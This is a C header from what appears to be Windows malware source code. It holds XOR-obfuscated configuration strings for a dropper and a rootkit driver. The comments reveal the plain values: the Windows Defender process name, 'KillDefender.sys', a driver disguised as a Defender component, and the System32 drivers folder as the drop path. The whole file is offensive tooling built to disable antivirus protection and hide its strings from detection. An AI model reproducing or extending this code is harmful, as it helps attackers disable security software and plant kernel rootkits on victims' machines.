#pragma once
#include <Windows.h>

#define _USELOG

static BYTE ENV_XOR_KEY = 0xFA;


typedef struct _Config {
	BYTE	pEncrypted[50];
	CHAR	pszDecrypted[50];
	PBYTE	Key;
	BOOL	bDecrypted;
} Config, *PConfig;

// MsMpEng.exe
static Config g_win_def_proc_name = {
    {0xb7,0x89,0xb7,0x8a,0xbf,0x94,0x9d,0xd4,0x9f,0x82,0x9f,0},
    {0},
    &ENV_XOR_KEY,
    FALSE
};

// Dropper.exe
static Config g_dropper_name = {
    {0xbe,0x88,0x95,0x8a,0x8a,0x9f,0x88,0xd4,0x9f,0x82,0x9f,0},
    {0},
    &ENV_XOR_KEY,
    FALSE
};

// Windows Inside Defender Driver
static Config g_rootkit_name = {
    {0xad,0x93,0x94,0x9e,0x95,0x8d,0x89,0xda,0xb3,0x94,0x89,0x93,0x9e,0x9f,0xda,0xbe,0x9f,0x9c,0x9f,0x94,0x9e,0x9f,0x88,0xda,0xbe,0x88,0x93,0x8c,0x9f,0x88,0},
    {0},
    &ENV_XOR_KEY,
    FALSE
};

// KillDefender.sys
static Config g_rootkit_filename = {
    {0xb1,0x93,0x96,0x96,0xbe,0x9f,0x9c,0x9f,0x94,0x9e,0x9f,0x88,0xd4,0x89,0x83,0x89,0},
    {0},
    &ENV_XOR_KEY,
    FALSE
};

// C:\Users\Public\

static Config g_public_profile = {
    {0xb9,0xc0,0xa6,0xaf,0x89,0x9f,0x88,0x89,0xa6,0xaa,0x8f,0x98,0x96,0x93,0x99,0xa6,0},
    {0},
    &ENV_XOR_KEY,
    FALSE
};

// \System32\drivers
static Config g_rootkit_drop_dest = {
    { 0xa6,0xa9,0x83,0x89,0x8e,0x9f,0x97,0xc9,0xc8,0xa6,0x9e,0x88,0x93,0x8c,0x9f,0x88,0x89,0 },
    {0},
    &ENV_XOR_KEY,
    FALSE
};

BOOL DecryptConfig(PConfig Config);